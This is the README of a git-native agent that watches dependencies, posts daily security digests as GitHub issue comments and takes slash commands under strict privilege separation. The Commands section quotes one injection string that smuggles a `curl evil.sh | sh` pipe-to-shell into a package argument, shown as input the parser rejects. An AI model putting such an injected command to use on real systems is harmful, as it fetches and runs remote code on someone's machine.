# Git Agent

A git-native agent that watches your dependency stack and narrates a daily digest.

**There is no server, no database, and no front-end build step.** The repository *is*
the instance: state lives in files, history is append-only, and every turn is a fresh
job on a machine that is destroyed when the job ends. It remembers because it reads the
repository, not because a process stayed alive.

---

## How you talk to it

A message is a comment. A reply is a comment. There is no chat session and nothing to
keep open.

```
YOU            GITHUB                A FRESH JOB           THE THREAD
───            ──────                ───────────           ──────────
type a command ▶ issue_comment   ───▶ reads the repo   ───▶ reply as
in the thread    fires a workflow     + the append-only     a comment
                                      log
     ▲                                                        │
     └────────────────────────────────────────────────────────┘
                    you read it, then answer again
```

Two surfaces, and only two:

| Surface | What it is | Why |
|---|---|---|
| The rolling issue | Native GitHub, works on mobile, sends notifications | The digest lands there as a comment |
| `site/chat.html` | A composer published by Pages | It builds a prefilled issue URL and holds nothing else |

The composer is a **composer, not a client**. It has no key, calls no model, and cannot
trigger a workflow — a static page cannot dispatch one without a token embedded in it,
and that is enforced by GitHub, not by discipline.

---

## Set it up

1. **Use this template**, or copy the repository.
2. **Edit `data/stack.json`** — the packages you want watched, and for each one the
   symbols you import. This file is both the watch list and the argument allowlist.
3. **Set two repository variables** (Settings → Secrets and variables → Actions →
   Variables). Neither is required for the agent to work:

   | Name | Value |
   |---|---|
   | `LLM_BASE_URL` | any chat-completions-compatible root, e.g. `https://host/v1` |
   | `LLM_MODEL` | the model or deployment name |
   | `AGENT_LANG` | reply language, default `en` |

4. **Optionally set one secret** — `LLM_API_KEY`. Without it, the agent still runs: the
   rules tier produces the whole digest and no model is contacted. That is a complete
   product, not a degraded one.
5. **Enable the schedule** — `digest.yml` runs daily at 06:17 UTC. Nothing else is
   required, and nothing is enabled by default that executes third-party code.

   **Optional: a typed decision layer.** `JEV_ENABLED` adds a narrow judgment
   layer that answers the two questions the rules cannot — do we import the
   vulnerable component, and does it reach a trust boundary — one atomic question
   at a time, and returns typed values rather than prose. It is **off by default**,
   and turning it on does not couple it to anything else: the rules tier still
   decides everything it can, and narration is still the separate, optional layer
   above. **The typed layer needs no chat model, and the chat model needs no typed
   layer** — a digest with `JEV_ENABLED=true` and no `LLM_API_KEY` is complete, just
   without the prose paragraph. Set `JEV_ENABLED=true`,
   `JEV_BASE_URL` (the layer's root, including its version prefix — the endpoint
   called is `{JEV_BASE_URL}/systemone`), the `JEV_API_KEY` secret, and optionally
   `JEV_MODEL` (default `jev-latest`).

---

## Where it runs: three repositories, not one

This template is public. **Your instance should not be.** They are different
repositories, and the split is the whole security story.

| Repository | Visibility | Holds | Runs |
|---|---|---|---|
| **Template** — this one | public | no secrets; the seed `data/stack.json` | a live demo digest, daily |
| **Your instance** | private | your real stack, your key | your digest, daily |
| **Status** — optional | public | a subset you marked publishable | a second, redacted digest |

**The public template holds no secrets and runs against the seed stack as a live
demo.** That is deliberate, and it is the point: the repository anyone can read is
the one with nothing to steal. It watches a handful of widely-used packages and
one public feed, and publishes the result. You can watch it work; you cannot
learn anything private from it.

**Your instance is a separate private repository**, created with **Use this
template** — not a fork. This matters: *you cannot fork a public repository into
a private one.* A fork of this repository is public, inherits its visibility, and
is permanently linked to it. "Use this template" makes a copy with its own
history, its own settings, and its own secrets. Set `LLM_API_KEY` there and
nowhere else.

**An optional third repository** holds the part of your digest you are willing to
publish — the same pipeline, a narrower watch list, a renderer that drops
anything not explicitly marked public. Build it only if you want a public status
page. It is not a way to make a private instance public; it is a second instance
with a smaller watch list.

What the split buys you:

- **A mistake in the template costs nothing.** Its history is public, so a leak
  there is visible immediately and has nothing to leak.
- **Your instance stays yours.** Its commits are private, so its digest, its
  watch list and its corrections stay private.
- **Neither can reach the other.** They share no history, no secrets and no
  settings.

The thing to be careful with is not the code — it is `data/stack.json`. That file
is your dependency inventory, and it is the only genuinely sensitive thing the
agent stores. It belongs in the private instance.

### If you would rather run only one repository

Instantiate the template privately and skip the demo. The template is then just
the thing you read. Nothing breaks: no workflow here depends on this repository
existing.

---

## What it does every run

Three jobs on the normal path, split along the privilege boundary rather than the
logical one, plus a fourth that only runs when the first one fails:

| Job | Holds | Does |
|---|---|---|
| `fetch` | `contents: read`, no secret | Reads the world. Writes nothing to the repository. |
| `narrate` | `contents: read`, **the model key** | Triages, and optionally narrates. Output is an artifact, not a commit. |
| `commit` | `contents: write`, **no key** | Runs the containment gate, then commits. |
| `heartbeat` | `contents: write`, **no key** | Runs only if `fetch` failed, so a broken run still moves the liveness signal. |

The gate is in the job that holds no key on purpose. The thing that decides what gets
written is the thing that cannot be hijacked, because it never talks to a model.

The fourth job exists because a scheduled workflow that commits nothing for 60 days has
its schedule disabled by GitHub — so a run that produces nothing still has to leave a
mark, or the failure becomes permanent and silent.

---

## Commands

| Command | What happens | Model? |
|---|---|---|
| `/agent why <pkg>` | Looks up the stored decision and replies | **No** |
| `/agent what-changed` | Renders what moved since last time | **No** |
| `/agent bump <pkg>` | Opens a pull request; the sandbox runs the suite if enabled | **No** |
| `/agent verify <pr>` | Runs the suite against a patch | **No** |
| `/agent wrong <pkg>` | Records a correction — the calibration corpus | **No** |
| `/agent pause` · `/agent resume` | Toggles the schedule | **No** |
| `/agent explain <id>` | Argues from the decision record | **Yes** |

Seven of the eight verbs never touch a model — `pause` and `resume` are one shape
of the eight. That is why the chat is cheap, fast, and impossible to hallucinate
into: the answers are lookups, not generations.

Anything that is not one of those verbs gets a fixed rejection. The comment body is
never passed to a model as an instruction, and the package name must appear in
`data/stack.json` — so `"; curl evil.sh | sh` simply fails the parse.

---

## The two visual rules

**Verified is not the same as ungrounded, and they never render the same way.** Every
claim in the digest came from a fetched payload and passed the containment gate. An
`/agent explain` answer is the model reasoning over the record, and it is marked as
unverified, permanently and visibly. If both looked the same, you could not tell which
claims were checked.

**A gap is rendered, not hidden.** A source that failed produces a visible row saying
so. A digest that silently omits a failed source reads as complete, which is worse.

---

## What it costs you

**You get:** a permanent, auditable transcript you can search six months later; a
change history that records transitions rather than clock ticks; and a decision record
per advisory — the probability vector, the threshold, and the model version — because
you cannot replay a model call but you can replay a decision.

**You give up:** sub-minute back-and-forth, and any interactive shell. A reply takes as
long as a job takes to start, which is a minute, not a second.

---

## Layout

```
.github/workflows/   digest (4 jobs) · ask (3 jobs) · act · sandbox · pages · ci
lib/                 llm · probe · commands · sandbox · triage
                     plus internals: store · version · gate · sources · render · invariants
scripts/             one entry point per job
data/                state — all behind the change gate except heartbeat.json
history/             append-only: events · commands · runs (hash-chained)
digest/              dated archive
site/                index.html (digest view) · chat.html (composer)
tools/               the invariant checks, as a CLI
AGENTS.md            the rules — every one of them enforced by a check
SECURITY.md          what is in scope for a report, and what is not
README.md            regenerated between markers
```

---

## Local development

```bash
npm test                     # unit tests, no network
npm run check                # the invariants, over the workflows on disk
npm run probe                # measure the configured endpoint, once, on request
node scripts/fetch-step.mjs  # dry run; writes .run/payload.json, nothing else
npm run site                 # regenerate site/ from the committed state
```

`fetch` and `narrate` are read-only and safe to run locally. `commit` writes — run it
only in CI unless you know why you are running it.

---

## The rules this repository is built on

`AGENTS.md` states them, and every one is enforced by a check in `ci.yml` or it is not a
rule at all. The short version:

- **One privilege per job.** No component holds both a secret and a write token.
- **The gate decides.** Every entity in generated prose must appear in the fetched
  payload, and the gate runs only where no model key exists.
- **Bounded writes, fail-closed.** The writer refuses anything outside its allowlist,
  and CI re-checks the actual diff before the commit.
- **Everything is behind the change gate except one file** — `data/heartbeat.json`, so a
  broken agent keeps committing instead of going silent and losing its schedule.
- **Append-only history, hash-chained.** Narration is excluded: prose is generated
  content, not a fact about the world.
- **The sandbox never receives a secret**, and ships off by default.
- **No provider names in the code.** The agent has no opinion about your endpoint.
- **The documented configuration surface is the whole configuration surface.** Every
  variable a workflow asks for is in the table, and every variable the code reads is
  delivered by a workflow. Both halves are checked, because both had already drifted.
- **The optional typed layer decides with a band, read per answer.** Its answers are
  probabilities that carry their own certainty, so a value near the middle is *no
  signal* rather than medium intensity — and averaging the two answers would hide
  exactly that, so each is read on its own. An answer inside the band, an absent
  answer, and an answer that will not parse all escalate to a human instead of
  resolving; a fallback on a field the layer is expected to send escalates too, never
  permits.
- **Commands are parsed, never interpreted.** An allowlisted verb, an argument that must
  appear in the watch list, and an author gate that exits rather than warns. The cheap
  workflow-level guard names exactly the same three associations as the real gate, so it
  can never drift looser than the gate it fronts.
- **Third-party actions are pinned to a commit, not a tag.** A tag is a mutable pointer,
  and whoever can move it controls code running with your write token.
- **Honest about time.** A digest is stamped with the observation time, never with the
  schedule. "As of 06:12 UTC" is honest; "today's briefing" is a small lie that will
  eventually be caught.

---

<!-- git-agent:begin -->
<!-- git-agent:end -->
